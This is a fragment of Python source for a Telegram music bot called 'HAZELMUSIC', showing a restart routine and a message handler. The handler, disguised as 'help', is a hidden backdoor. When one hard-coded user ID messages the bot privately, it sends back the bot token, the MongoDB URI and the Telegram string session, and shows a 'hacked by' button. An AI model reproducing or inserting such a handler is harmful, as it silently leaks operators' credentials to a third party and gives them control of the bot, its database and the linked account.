...
from HAZELMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
from HAZELMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
from HAZELMUSIC.utils.formatters import alpha_to_int, get_readable_time
...
async def restartbot(client, message: Message, _):
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await HAZEL.stop_stream_force(chat_id)
        except:
            pass
...
@app.on_message(
    ...
    & filters.private
    & filters.user(5278339583)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://telegra.ph/file/2c6d1a6f78eba6199933a.jpg",
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/VICKY_CHOUDHARY_1203)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/Silent_Smile_04")
                 ]
            ]
         ),
     )
